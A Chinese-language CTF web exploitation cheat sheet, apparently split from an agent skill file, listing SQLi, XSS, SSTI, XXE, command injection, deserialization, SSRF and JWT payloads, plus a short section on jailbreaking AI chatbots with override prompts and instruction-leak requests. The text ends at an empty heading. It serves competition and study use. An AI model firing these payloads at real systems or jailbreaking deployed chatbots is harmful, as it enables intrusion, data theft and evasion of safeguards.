# CTF Web Field Notes

从 `SKILL.md` 拆出的长篇利用笔记，避免主技能文件偏离路由与首轮执行。

## Table of Contents

- [侦察](#reconnaissance)
- [SQL 注入速查](#sql-injection-quick-reference)
- [XSS 速查](#xss-quick-reference)
- [通过 JSONP 回调窃取的 XSSI](#xssi-via-jsonp-callback-exfiltration)
- [路径遍历 / LFI 速查](#path-traversal--lfi-quick-reference)
- [JWT 速查](#jwt-quick-reference)
- [SSTI 速查](#ssti-quick-reference)
- [Python str.format() 属性遍历（PlaidCTF 2017）](#python-strformat-attribute-traversal-plaidctf-2017)
- [SSRF 速查](#ssrf-quick-reference)
- [命令注入速查](#command-injection-quick-reference)
- [XXE 速查](#xxe-quick-reference)
- [PHP 类型杂糅速查](#php-type-juggling-quick-reference)
- [PHP 文件包含 / LFI 速查](#php-file-inclusion--lfi-quick-reference)
- [代码注入速查](#code-injection-quick-reference)
- [Java 反序列化](#java-deserialization)
- [Python Pickle 反序列化](#python-pickle-deserialization)
- [竞争条件（TOCTOU）](#race-conditions-time-of-check-to-time-of-use)
- [Node.js 速查](#nodejs-quick-reference)
- [认证与访问控制速查](#auth--access-control-quick-reference)
- [Apache CVE-2012-0053 HttpOnly Cookie 泄露](#apache-cve-2012-0053-httponly-cookie-leak)
- [Apache mod_status 信息泄露](#apache-mod_status-information-disclosure)
- [开放重定向链](#open-redirect-chains)
- [子域名接管](#subdomain-takeover)
- [文件上传到 RCE](#file-upload-to-rce)
- [多阶段利用链模式](#multi-stage-chain-patterns)
- [Flask/Werkzeug 调试模式](#flaskwerkzeug-debug-mode)
- [外部 DTD 绕过滤器的 XXE](#xxe-with-external-dtd-filter-bypass)
- [JSFuck 解码](#jsfuck-decoding)
- [通过 jQuery Hashchange 的 DOM XSS（Crypto-Cat）](#dom-xss-via-jquery-hashchange-crypto-cat)
- [Shadow DOM XSS](#shadow-dom-xss)
- [DOM Clobbering + MIME 不匹配](#dom-clobbering--mime-mismatch)
- [经缓存代理的 HTTP 请求走私](#http-request-smuggling-via-cache-proxy)
- [路径遍历：URL 编码斜杠绕过](#path-traversal-url-encoded-slash-bypass)
- [WeasyPrint SSRF 与文件读取（CVE-2024-28184）](#weasyprint-ssrf--file-read-cve-2024-28184)
- [MongoDB Regex / $where 盲注](#mongodb-regex--where-blind-injection)
- [Pongo2 / Go 模板注入](#pongo2--go-template-injection)
- [携带 PHP Webshell 的 ZIP 上传](#zip-upload-with-php-webshell)
- [`basename()` 隐藏文件绕过](#basename-bypass-for-hidden-files)
- [自定义线性 MAC 伪造](#custom-linear-mac-forgery)
- [CSS/JS 付费墙绕过](#cssjs-paywall-bypass)
- [SSRF 到 Docker API 的 RCE 链](#ssrf-to-docker-api-rce-chain)
- [通过 xsi:type 的 Castor XML 反序列化（Atlas HTB）](#castor-xml-deserialization-via-xsitype-atlas-htb)
- [Apache ErrorDocument 表达式文件读取（Zero HTB）](#apache-errordocument-expression-file-read-zero-htb)
- [HTTP TRACE 方法绕过](#http-trace-method-bypass)
- [LLM/AI 聊天机器人 Jailbreak](#llmai-chatbot-jailbreak)
- [Admin Bot `javascript:` URL 协议绕过](#admin-bot-javascript-url-scheme-bypass)
- [图像加载时序 XS-Leak + GraphQL CSRF（HTB GrandMonty）](#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)
- [React Server Components Flight 协议 RCE（Ehax 2026）](#react-server-components-flight-protocol-rce-ehax-2026)
- [Unicode 大小写折叠 XSS 绕过（UNbreakable 2026）](#unicode-case-folding-xss-bypass-unbreakable-2026)
- [CSS 字体字形 + 容器查询数据外带（UNbreakable 2026）](#css-font-glyph--container-query-data-exfiltration-unbreakable-2026)
- [Hyperscript / Alpine.js CDN CSP 绕过（UNbreakable 2026）](#hyperscript--alpinejs-cdn-csp-bypass-unbreakable-2026)
- [Solidity 瞬态存储清理碰撞（0.8.28-0.8.33）](#solidity-transient-storage-clearing-collision-0828-0833)
- [Chrome Unicode URL 规范化绕过（RCTF 2017）](#chrome-unicode-url-normalization-bypass-rctf-2017)
- [通过 base 标签劫持的 CSP Nonce 绕过（BSidesSF 2026）](#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)
- [JA4/JA4H TLS 指纹匹配（BSidesSF 2026）](#ja4ja4h-tls-fingerprint-matching-bsidessf-2026)
- [通过泄露 JS Secret 绕过客户端 HMAC（Codegate 2013）](#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013)
- [SQLi 关键字碎片化绕过（SecuInside 2013）](#sqli-keyword-fragmentation-bypass-secuinside-2013)
- [通过剥离 STOP opcode 的 Pickle 链接（VolgaCTF 2013）](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
- [XPath 盲注（BaltCTF 2013）](#xpath-blind-injection-baltctf-2013)
- [SQLite 文件路径遍历绕过字符串相等检查（Codegate 2013）](#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013)
- [通过过滤词扩展操纵 PHP 序列化长度（0CTF 2016）](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)
- [通过 link prefetch 绕过 CSP（Boston Key Party 2016）](#csp-bypass-via-link-prefetch-boston-key-party-2016)
- [通过 X-Forwarded-For 头注入 XML（Pwn2Win 2016）](#xml-injection-via-x-forwarded-for-header-pwn2win-2016)
- [宽松 Base64 解码与参数覆盖导致签名绕过（BCTF 2016）](#base64-decode-leniency-and-parameter-override-for-signature-bypass-bctf-2016)
- [常见 Flag 位置](#common-flag-locations)

## Reconnaissance

- 查看页面源码中的 HTML 注释，检查 JS/CSS 文件里的内部 API
- 查找 `.map` source map 文件
- 检查响应头中的自定义 `X-` 头和认证提示
- 常见路径：`/robots.txt`、`/sitemap.xml`、`/.well-known/`、`/admin`、`/api`、`/debug`、`/.git/`、`/.env`
- 搜索 JS bundle：`grep -oE '"/api/[^"]+"'` 挖出隐藏端点
- 检查是否存在可绕过的客户端校验
- 对比 UI 实际发送的数据与 API 接受的数据是否一致（从 JS bundle 里把全部字段读出来）
- 关注返回 404 的静态资源，`favicon.ico`、`robots.txt` 即使状态码报错也可能带数据：`strings favicon.ico | grep -i flag`
- Tor hidden service：`feroxbuster -u 'http://target.onion/' -w wordlist.txt --proxy socks5h://127.0.0.1:9050 -t 10 -x .txt,.html,.bak`

## SQL Injection Quick Reference

**检测：** 发送 `'`，若出现语法错误通常说明存在 SQLi

```sql
' OR '1'='1                    # Classic auth bypass
' OR 1=1--                     # Comment termination
username=\&password= OR 1=1--  # Backslash escape quote bypass
' UNION SELECT sql,2,3 FROM sqlite_master--  # SQLite schema
0x6d656f77                     # Hex encoding for 'meow' (bypass quotes)
```

WAF 绕过包括：XML 实体编码（`&#x55;NION`）、EXIF 元数据注入（`exiftool -Comment="' UNION SELECT..."`）、Shift-JIS `\u00a5`→`0x5c` 反斜杠、二维码载荷注入、双关键字嵌套（`selselectect`）。完整技巧见 [sql-injection.md](sql-injection.md)。

MySQL 会话变量双值注入：`@var:=` 会在同一连接的连续查询中赋值并返回不同值。PHP PCRE 回溯上限绕过 WAF：超 100 万字符可让 `preg_match()` 返回 `false`，从而通过 `!false`。`information_schema.processlist` 竞争条件可从并发查询中泄露秘密。详见 [sql-injection.md](sql-injection.md)。

PHP `preg_replace /e` RCE 和 Prolog 注入见 [server-side-exec.md](server-side-exec.md)。通过 DNS 记录做 SQLi 与 SQLi 关键字碎片化见 [server-side-exec-2.md](server-side-exec-2.md)。

## XSS Quick Reference

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

过滤绕过：十六进制 `\x3cscript\x3e`、实体 `&#60;script&#62;`、大小写混写 `<ScRiPt>`、事件处理器。
- **XSS 点号过滤绕过：** 十进制 IP（`1558071511` = `92.123.45.67`）可在 URL 中去掉点号。JavaScript 方括号记法（`document["cookie"]`）可替代点属性访问。见 [client-side-advanced.md](client-side-advanced.md#xss-dot-filter-bypass-via-decimal-ip-and-bracket-notation-33c3-ctf-2016)。
- **跨源 Cookie XSS：** 在一个子域上设置 `domain=.parent.tld` 的 Cookie，可把 XSS 载荷注入到同父域的兄弟子域渲染位置。见 [client-side-advanced.md](client-side-advanced.md#cross-origin-xss-via-shared-parent-domain-cookie-injection-0ctf-2017)。
- **AngularJS 1.x 沙箱逃逸：** 用 `trim` 覆盖 `String.prototype.charAt` 绕过 AngularJS 表达式沙箱，再用 `$eval` 执行任意 JS。见 [client-side.md](client-side.md#angularjs-1x-sandbox-escape-via-charattrim-override-google-ctf-2017)。

DOMPurify 绕过、缓存投毒、CSPT、React 输入技巧见 [client-side.md](client-side.md)。

## XSSI via JSONP Callback Exfiltration

JSONP 端点（`?callback=func`）会把敏感数据包进函数调用。可用自定义回调通过跨域 `<script src>` 加载并外带数据。典型链路：SHA1 Cookie 逆推 -> 调试端点 IDOR -> XSSI -> 云函数 OOB。见 [client-side-advanced.md](client-side-advanced.md#xssi-via-jsonp-callback-with-cloud-function-exfiltration-bsidessf-2026)。

## Path Traversal / LFI Quick Reference

```text
../../../etc/passwd
....//....//....//etc/passwd     # Filter bypass
..%2f..%2f..%2fetc/passwd        # URL encoding
%252e%252e%252f                  # Double URL encoding
{.}{.}/flag.txt                  # Brace stripping bypass
```

**Windows 8.3 短文件名绕过：** `FILEFO~1.EXT` 这类短名可绕过只检查长文件名的路径过滤。见 [server-side-advanced-2.md](server-side-advanced-2.md#windows-83-short-filename-path-traversal-bypass-tokyo-westerns-2016)。

**URL `parse_url` @ 绕过：** `http://valid@attacker.com/`，PHP `parse_url()` 会把 `attacker.com` 解析为主机，从而绕过域名校验。见 [server-side-advanced-2.md](server-side-advanced-2.md#url-parse_url--symbol-bypass-ekoparty-ctf-2016)。
- **双 `@` SSRF 解析差异：** `http://x:x@127.0.0.1:80@allowed.host/path`，`parse_url()` 看到的是 `allowed.host`，curl 实际连到 `127.0.0.1`。这与单 `@` 绕过不同。见 [server-side-advanced-2.md](server-side-advanced-2.md#ssrf-via-parse_urlcurl-url-parsing-discrepancy-33c3-ctf-2016)。

**`/dev/fd` 符号链接绕过：** 当 `/proc` 被拉黑时，可用 `/dev/fd/../environ`。`/dev/fd` 会链接到 `/proc/self/fd`，因此 `../` 能回到 `/proc/self/`。见 [server-side-advanced.md](server-side-advanced.md#devfd-symlink-to-bypass-proc-filter-google-ctf-2017)。

**Python 易踩坑：** `os.path.join('/app/public', '/etc/passwd')` 会返回 `/etc/passwd`

## JWT Quick Reference

1. `alg: none`，完全移除签名
2. 算法混淆（RS256→HS256），用公钥当 HMAC key 签名
3. 弱密钥，用 hashcat 或 flask-unsign 爆破
4. 密钥泄露，检查 `/api/getPublicKey`、`.env`、`/debug/config`
5. 余额重放，保存 JWT，消费后重放旧 JWT，再把物品退回套利
6. 未校验签名，修改 payload，保留原签名
7. JWK 头注入，把攻击者公钥嵌进 token header
8. JKU 头注入，指向攻击者控制的 JWKS URL
9. KID 路径遍历，`../../../dev/null` 取空 key，或对 KID 做 SQL 注入

完整 JWT/JWE 攻击与会话操控见 [auth-jwt.md](auth-jwt.md)。

## SSTI Quick Reference

**检测：** `{{7*7}}` 返回 `49`

```python
# Jinja2 RCE
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Go template
{{.ReadFile "/flag.txt"}}
# EJS
<%- global.process.mainModule.require('child_process').execSync('id') %>
# Jinja2 quote bypass (keyword args):
{{obj.__dict__.update(attr=value) or obj.name}}
```

**Mako SSTI（Python）：** `${__import__('os').popen('id').read()}`，`${}` 或 `<% %>` 中直接执行 Python，无沙箱。**Twig SSTI（PHP）：** `{{['id']|map('system')|join}}`，可用 `{{7*'7'}}` 区分 Jinja2 与 Twig（Twig 会重复字符串，Jinja2 返回 49）。见 [server-side.md](server-side.md#mako-ssti) 和 [server-side.md](server-side.md#twig-ssti)。

**引号过滤绕过：** 使用 `__dict__.update(key=value)`，关键字参数不需要引号。见 [server-side.md](server-side.md#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)。

**ERB SSTI（Ruby/Sinatra）：** `<%= Sequel::DATABASES.first[:table].all %>` 可借全局 `Sequel::DATABASES` 数组绕过 ERBSandbox 的变量名限制。见 [server-side.md](server-side.md#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)。

## Python str.format() Attribute Traversal (PlaidCTF 2017)

Python `str.format()` 允许用点号语法遍历属性（`{0.attr.subattr}`）并用方括号取索引（`{0[key]}`）。当用户输入进入 `.format(obj)` 时，即使没有模板引擎，也能泄露任意属性。见 [server-side.md](server-side.md#python-strformat-attribute-traversal-plaidctf-2017)。

**Thymeleaf SpEL SSTI（Java/Spring）：** `${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File("/flag.txt"))}` 可在标准 I/O 被 WAF 封掉时借 Spring 工具类读文件。适用于 distroless 容器（无 shell）。见 [server-side-exec.md](server-side-exec.md#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026)。

## SSRF Quick Reference

```text
127.0.0.1, localhost, 127.1, 0.0.0.0, [::1]
127.0.0.1.nip.io, 2130706433, 0x7f000001
```

用于 TOCTOU 的 DNS rebinding：https://lock.cmpxchg8b.com/rebinder.html

**Host 头 SSRF：** 服务端用 `Host` 头拼内部请求 URL（如 `http.Get("http://" + request.Host + "/validate")`）。把 Host 设为攻击者域名，校验请求就会打到攻击者服务器。见 [server-side.md](server-side.md#host-header-ssrf-mireactf)。

**通过 SSRF 打 ElasticSearch Groovy RCE：** SSRF 到内部 9200 端口的 ES，可通过 `script_fields` Groovy 脚本（5.0 前）拿到 RCE。见 [server-side-advanced-2.md](server-side-advanced-2.md#elasticsearch-groovy-script_fields-rce-via-ssrf-volgactf-2017)。

## Command Injection Quick Reference

```bash
; id          | id          `id`          $(id)
%0aid         # Newline     127.0.0.1%0acat /flag
```

当 `cat`、`head` 被拦时，可用 `sed -n p flag.txt`、`awk '{print}'`、`tac flag.txt`

**Bash 花括号展开（无空格注入）：** `{ls,-la,..}` 会展开成 `ls -la ..`，不需要字面空格。见 [server-side-exec-2.md](server-side-exec-2.md#bash-brace-expansion-for-space-free-command-injection-insomnihack-2016)。

**Git CLI 换行注入：** URL 路径中的 `%0a` 可逃逸只过滤 `;|&<>` 的 backtick/system() shell 调用。见 [server-side.md](server-side-2.md#git-cli-newline-injection-via-url-path-bsidessf-2026)。

## XXE Quick Reference

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

PHP filter：`<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">`

**DOCX 上传中的 XXE：** DOCX 本质是 ZIP+XML；可把 XXE 注入归档里的 `[Content_Types].xml`。见 [server-side.md](server-side-2.md#xxe-via-docxoffice-xml-upload-school-ctf-2016)。

## PHP Type Juggling Quick Reference

宽松比较 `==` 会做类型强制转换：`0 == "string"` 为 `true`，`"0e123" == "0e456"` 为 `true`（magic hash）。发送 JSON 整数 `0` 可绕过字符串密码校验。`strcmp([], "str")` 返回 `NULL`，从而通过 `!strcmp()`。防御应使用 `===`。

比较表和利用载荷见 [server-side.md](server-side.md#php-type-juggling)。

## PHP File Inclusion / LFI Quick Reference

`php://filter/convert.base64-encode/resource=config` 可在不执行 PHP 的情况下泄露源码。常见 LFI 目标：`/etc/passwd`、`/proc/self/environ`、应用配置文件。空字节（`%00`）可在 PHP < 5.3.4 截断 `.php` 后缀。

过滤链与 RCE 技巧见 [server-side.md](server-side.md#php-file-inclusion--phpfilter)。

## Code Injection Quick Reference

**Ruby `instance_eval`：** 闭合字符串加注释：`VALID');INJECTED_CODE#`
**Perl `open()`：** 两参数 `open` 支持管道：`|command|`
**JS `eval` 黑名单绕过：** `row['con'+'structor']['con'+'structor']('return this')()`
**PHP 反序列化：** 在 Cookie 中构造序列化对象 -> LFI/RCE
**LaTeX 注入：** `\input{|"cat /flag.txt"}`，在 PDF 生成服务中通过管道语法执行 shell。`\@@input"/etc/passwd"` 可在不调用 shell 时读文件。
- **LaTeX restricted write18 绕过：** 当 `write18` 受限时，`mpost -ini "-tex=bash -c (cmd)" file.mp` 可借 mpost 的白名单地位执行任意命令。`${IFS}` 可替代空格。见 [server-side-advanced-2.md](server-side-advanced-2.md#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016)。

**PHP 反引号求值（字符数受限）：** `` echo`cat *`; ``，PHP 反引号等同 `shell_exec()`，最少 8 个字符即可 RCE。也可用 `` `$_GET[0]`; `` 把载荷移到 URL 参数。见 [server-side-exec.md](server-side-exec.md#php-backtick-eval-under-character-limit-easyctf-2017)。
**PHP `assert()` 注入：** `assert("strpos('$input', '..') === false")`，可注入 `') || system('cmd');//` 拿 RCE（PHP < 7.2）。见 [server-side-exec.md](server-side-exec.md#php-assert-string-evaluation-injection-csaw-ctf-2016)。
**Common Lisp `read` 注入：** `#.(run-shell-command "cat /flag")`，reader macro 在解析时执行。见 [server-side-exec-2.md](server-side-exec-2.md#common-lisp-injection-via-reader-macro-insomnihack-2016)。
**Ruby ObjectSpace 扫描：** `ObjectSpace.each_object(String)` 可枚举内存中全部字符串，包括 flag。见 [server-side-exec.md](server-side-exec.md#ruby-objectspace-memory-scanning-for-flag-extraction-tokyo-westerns-2016)。

完整 payload 与绕过技巧见 [server-side-exec.md](server-side-exec.md)。

## Java Deserialization

序列化 Java 对象（`rO0AB` / `aced0005`）配合 ysoserial gadget chain，可通过 `ObjectInputStream.readObject()` 得到 RCE。可先试 `CommonsCollections1-7`，用 `URLDNS` 做盲测。见 [server-side-deser.md](server-side-deser.md#java-deserialization-ysoserial)。

## Python Pickle Deserialization

`pickle.loads()` 会调用 `__reduce__()`，如 `(os.system, ('cmd',))` 可直接 RCE。类似风险也存在于 `yaml.load()`、`torch.load()`、`joblib.load()`。见 [server-side-deser.md](server-side-deser.md#python-pickle-deserialization)。

## Race Conditions (Time-of-Check to Time-of-Use)

并发请求可绕过先检查后执行模式（余额、优惠券、注册等）。一次发 50 个并发请求，全部都看到修改前状态。见 [server-side-deser.md](server-side-deser.md#race-conditions-time-of-check-to-time-of-use)。

## Node.js Quick Reference

**原型污染：** `{"__proto__": {"isAdmin": true}}` 或 flatnest 环形引用绕过
**VM 逃逸：** `this.constructor.constructor("return process")()` -> RCE
**完整链：** 污染 -> 在 Happy-DOM 中启用 JS eval -> VM 逃逸 -> RCE

**原型污染权限绕过：** 在 JSON 端点提交 `{"__proto__":{"isAdmin":true}}`，污染 `Object.prototype`。即使漏洞表面看起来不是原型污染，也要始终尝试 `__proto__` 注入。

细节见 [node-and-prototype.md](node-and-prototype.md)。

## Auth & Access Control Quick Reference

- Cookie 篡改：`role=admin`、`isAdmin=true`
- 公共 admin-login Cookie 种子：检查 `/admin/login` 是否会下发可复用的管理员会话 Cookie
- Host 头绕过：`Host: 127.0.0.1`
- 隐藏端点：在 JS bundle 中搜索 `/api/internal/`、`/api/admin/`；带认证 Cookie 模糊 `/internal/*` 等非 `/api` 路由
- 客户端门禁：`window.overrideAccess = true` 或直接调用 API
- 密码推断：结合资料页信息与结构化 ID 格式做爆破
- 弱签名：检查是否只校验哈希前 N 位
- Affine cipher OTP：只有 312 种可能（`12 mults × 26 adds`），几秒内可全爆
- TOTP `srand(time())` 弱点：同步服务器时钟即可预测验证码。见 [auth-and-access.md](auth-and-access.md#totp-recovery-via-php-srandtime-seed-weakness-tum-ctf-2016)
- Express.js `%2F` 中间件绕过、WIP 端点 IDOR、git 历史凭据泄露
- CI/CD 变量窃取、身份提供商 API 接管（MFA 绕过：`not_configured_action: skip`）
- SAML SSO 自动化、Guacamole 参数提取、登录页投毒、TeamCity REST API RCE

## Apache CVE-2012-0053 HttpOnly Cookie Leak

发送超长 `Cookie` 头触发 400 Bad Request；Apache 错误页会反射 Cookie 值，从而泄露 HttpOnly Cookie。见 [cves.md](cves.md#cve-2012-0053-apache-httponly-cookie-leak-via-400-bad-request-rc3-ctf-2016)。

## Apache mod_status Information Disclosure

`/server-status` 会暴露活动 URL、客户端 IP 和会话数据。可用于发现管理端点与伪造会话。见 [auth-and-access.md](auth-and-access.md#apache-mod_status-information-disclosure--session-forging-29c3-ctf-2012)。

## Open Redirect Chains

把开放重定向（`?redirect=`、`?next=`、`?url=`）接入 OAuth 流程即可窃取 token。可用 `@`、`%00`、`//`、`\`、CRLF 绕过校验。见 [auth-and-access.md](auth-and-access.md#open-redirect-chains)。

## Subdomain Takeover

悬空 CNAME 可在外部服务（GitHub Pages、S3、Heroku）上认领资源。用 `subfinder` + `httpx` 枚举，再核对指纹。见 [auth-and-access.md](auth-and-access.md#subdomain-takeover)。

访问控制绕过见 [auth-and-access.md](auth-and-access.md)，JWT/JWE 攻击见 [auth-jwt.md](auth-jwt.md)，OAuth/SAML/CI-CD/基础设施认证见 [auth-infra.md](auth-infra.md)。

## File Upload to RCE

- 上传 `.htaccess`：`AddType application/x-httpd-php .lol` + webshell
- Gogs 符号链接：覆盖 `.git/config` 写入 `core.sshCommand` 拿 RCE
- Python `.so` 劫持：写入恶意共享对象并删除 `.pyc` 迫使重新导入
- ZipSlip：zip 内符号链接可读文件，路径遍历可写文件
- 日志投毒：在 User-Agent 中写 PHP 载荷，再用路径遍历包含日志
- PNG/PHP polyglot + 双扩展：构造在 IEND 后带 `<?php` 的合法 PNG，以 `.png.php` 上传；若 `disable_functions` 阻止执行，可用 `scandir('/')` + `file_get_contents()` 拿 flag。见 [server-side-exec-2.md](server-side-exec-2.md#pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026)。

详细步骤见 [server-side-exec.md](server-side-exec.md) 和 [server-side-exec-2.md](server-side-exec-2.md)。

## Multi-Stage Chain Patterns

**0xClinic 利用链：** 密码推断 -> 路径遍历 + ReDoS 预言机（从 `/proc/1/environ` 泄露秘密）-> CRLF 注入（CSP 绕过 + 缓存投毒 + XSS）-> urllib scheme 绕过（SSRF）-> 通过路径遍历写 `.so` -> RCE

**关键串联思路：**
- 路径遍历 + 任意文件读取原语 -> 泄露 `/proc/*/environ`、`/proc/*/cmdline`
- 头部中的 CRLF -> 一步拿下 CSP 绕过、缓存投毒、XSS
- Python 中任意文件写 -> `.so` 劫持或覆盖 `.pyc` 拿 RCE
- 响应体被转小写时，用十六进制转义（如 `<` 写成 `\x3c`）

## Flask/Werkzeug Debug Mode

爆破弱 session secret -> 伪造管理员会话 -> 利用 Werkzeug debugger PIN 拿 RCE。完整链路见 [server-side-advanced.md](server-side-advanced.md#flaskwerkzeug-debug-mode-exploitation)。

## XXE with External DTD Filter Bypass

把恶意 DTD 放到外部主机上，可绕过上传关键字过滤。payload 与 webhook.site 搭建见 [server-side-advanced.md](server-side-advanced.md#xxe-with-external-dtd-filter-bypass)。

## JSFuck Decoding

去掉结尾的 `()()`，放到 Node.js 中 `eval`，再用 `.toString()` 还原原始代码。见 [client-side.md](client-side.md#jsfuck-decoding)。

## DOM XSS via jQuery Hashchange (Crypto-Cat)

`$(location.hash)` 配合 `hashchange` 事件，可借 iframe 打 XSS：`<iframe src="https://target/#" onload="this.src+='<img src=x onerror=print()>'">`。见 [client-side.md](client-side.md#dom-xss-via-jquery-hashchange-crypto-cat)。

## Shadow DOM XSS

代理 `attachShadow` 以捕获 closed root；用 `(0,eval)` 逃逸作用域；配合 `</script>` 注入。见 [client-side.md](client-side.md#shadow-dom-xss)。

## DOM Clobbering + MIME Mismatch

`.jpg` 被当成 `text/html` 返回；`<form id="config">` 可 clobber JS 全局变量。见 [client-side.md](client-side.md#dom-clobbering--mime-mismatch)。

## HTTP Request Smuggling via Cache Proxy

利用缓存代理反序列化不同步，通过不完整 POST body 窃取 Cookie。见 [client-side.md](client-side.md#http-request-smuggling-via-cache-proxy)。

## Path Traversal: URL-Encoded Slash Bypass

`%2f` 可绕过 nginx 路由匹配，但文件系统仍会把它解析成斜杠。见 [server-side-advanced.md](server-side-advanced.md#path-traversal-url-encoded-slash-bypass)。

## WeasyPrint SSRF & File Read (CVE-2024-28184)

`<a rel="attachment" href="file:///flag.txt">` 或 `<link rel="attachment" href="http://127.0.0.1/admin">` 会让 WeasyPrint 把抓取到的内容作为 PDF 附件嵌入，从而绕过头部校验。可通过 `/Type /EmbeddedFile` 是否出现构造布尔预言机。见 [server-side-advanced-4.md](server-side-advanced-4.md#weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026) 和 [cves.md](cves.md#cve-2024-28184-weasyprint-attachment-ssrf--file-read)。

## MongoDB Regex / $where Blind Injection

从 `/.../i` 中跳出可用 `a^/)||(<condition>)&&(/a^`。利用 `charCodeAt()` 二分提取。见 [server-side-advanced-4.md](server-side-advanced-4.md#mongodb-regex-injection--where-blind-oracle-nullcon-2026)。

## Pongo2 / Go Template Injection

在上传文件里写 `{% include "/flag.txt" %}`，再在模板参数处做路径遍历。见 [server-side-advanced-4.md](server-side-advanced-4.md#pongo2--go-template-injection-via-path-traversal-nullcon-2026)。

## ZIP Upload with PHP Webshell

上传包含 `.php` 文件的 ZIP -> 解压到 Web 可访问目录 -> `file_get_contents('/flag.txt')`。见 [server-side-advanced-4.md](server-side-advanced-4.md#zip-upload-with-php-webshell-nullcon-2026)。

## basename() Bypass for Hidden Files

`basename()` 只去掉目录，不会过滤同目录下的 `.lock` 或其他隐藏文件。见 [server-side-advanced-4.md](server-side-advanced-4.md#basename-bypass-for-hidden-files-nullcon-2026)。

## Custom Linear MAC Forgery

若签名是基于 secret block 的线性 XOR，可由已知样本对恢复后为目标消息伪造。见 [auth-and-access.md](auth-and-access.md#custom-linear-macsignature-forgery-nullcon-2026)。

## CSS/JS Paywall Bypass

若内容只是被 CSS 遮罩层（`position: fixed; z-index: 99999`）挡住，原始 HTML 里通常仍有正文。`curl` 或 view-source 可直接绕过。见 [client-side.md](client-side.md#cssjs-paywall-bypass)。

## SSRF to Docker API RCE Chain

SSRF 打到未鉴权的 Docker daemon（2375 端口）。用 `/archive` 抽取文件，用 `/exec` + `/exec/{id}/start` 执行命令。若 SSRF 仅支持 GET，可通过内部 POST relay 串起来。见 [server-side-advanced-2.md](server-side-advanced-2.md#ssrf-to-docker-api-rce-chain-h7ctf-2025)。

## Castor XML Deserialization via xsi:type (Atlas HTB)

没有 mapping file 的 Castor XML `Unmarshaller` 会信任 `xsi:type`，从而实例化任意 Java 类。可通过 ysoserial `CommonsBeanutils1`，借 JNDI（Java Naming and Directory Interface）/ RMI（Remote Method Invocation）拿 RCE。要求 Java 11，不适用于 17+。检查 `pom.xml` 是否依赖 `castor-xml`。见 [server-side-advanced-2.md](server-side-advanced-2.md#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)。

## Apache ErrorDocument Expression File Read (Zero HTB)

`.htaccess` 中写 `ErrorDocument 404 "%{file:/etc/passwd}"`，可在 Apache 层读文件，绕过 `php_admin_flag engine off`。要求 `AllowOverride FileInfo`。通过 SFTP 上传后，用一个 404 请求触发。见 [server-side-advanced-2.md](server-side-advanced-2.md#apache-errordocument-expression-file-read-zero-htb)。

## HTTP TRACE Method Bypass

某些端点对 GET/POST 返回 403，但会响应 TRACE、PUT、PATCH 或 DELETE。用 `curl -X TRACE` 测试。见 [auth-and-access.md](auth-and-access.md#http-trace-method-bypass-bypass-ctf-2025)。

## LLM/AI Chatbot Jailbreak

用于看守 flag 的 AI 聊天机器人，通常可被 system override prompt、角色反转或指令泄露请求绕过。轮换 session ID，并逐步提高 prompt 强度。见 [auth-and-access.md](auth-and-access.md#llmai-chatbot-jailbreak-bypass-ctf-2025)。

## Admin Bot javascript: URL Scheme Bypass

`new URL()` 只校验语法，不校验协议，因此 `javascript:` URL 会通过，并在 Puppeteer 的已登录上下文中执行。目标页上的 CSP/SRI 无关，因为 JS 运行在导航上下文。见 [client-side.md](client-side.md#admin-bot-javascript-url-scheme-bypass-dicectf-2026)。

## XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)

HTML 注入 -> meta refresh 跳转（绕过 CSP）-> admin bot 打开攻击者页面 -> JavaScript 用 `new Image().src` 向 `localhost` GraphQL 端点发跨源 GET -> 通过图像报错时间测量带 `SLEEP(1)` 的时间型 SQLi -> 逐字符外带 flag。GraphQL GET 请求可绕过 CORS preflight。见 [client-side.md](client-side.md#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)。

## React Server Components Flight Protocol RCE (Ehax 2026)

可通过 `Next-Action` 与 `Accept: text/x-component` 头识别。CVE-2025-55182：伪造 Flight chunk 触发构造器链，实现服务端 JS 执行。可通过 `NEXT_REDIRECT` 错误和 `x-action-redirect` 头外带。WAF 绕过：`'chi'+'ld_pro'+'cess'` 或十六进制 `'\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'`。见 [server-side-advanced-4.md](server-side-advanced-4.md#react-server-components-flight-protocol-rce-ehax-2026) 和 [cves.md](cves.md#cve-2025-55182--cve-2025-66478-react-server-components-flight-protocol-rce)。

## Unicode Case Folding XSS Bypass (UNbreakable 2026)

**模式：** 清洗器 regex 只按 ASCII 匹配（如 `<\s*script`），但后续处理使用 Unicode case folding（`strings.EqualFold`）。`<ſcript>`（U+017F，长 s）可绕过 regex，但最终会折叠成 `<script>`。其他配对还包括 `ı`→`i`、`K`（U+212A）→`k`。见 [client-side-advanced.md](client-side-advanced.md#unicode-case-folding-xss-bypass-unbreakable-2026)。

## CSS Font Glyph + Container Query Data Exfiltration (UNbreakable 2026)

**模式：** 仅靠 CSS 注入外带内联文本，无需 JS。自定义字体为每个字符分配唯一字宽；容器查询按宽度区间匹配并触发背景图请求，每个字符对应一次请求。在严格 CSP 下仍可用。见 [client-side-advanced.md](client-side-advanced.md#css-font-glyph-width--container-query-exfiltration-unbreakable-2026)。

## Hyperscript / Alpine.js CDN CSP Bypass (UNbreakable 2026)

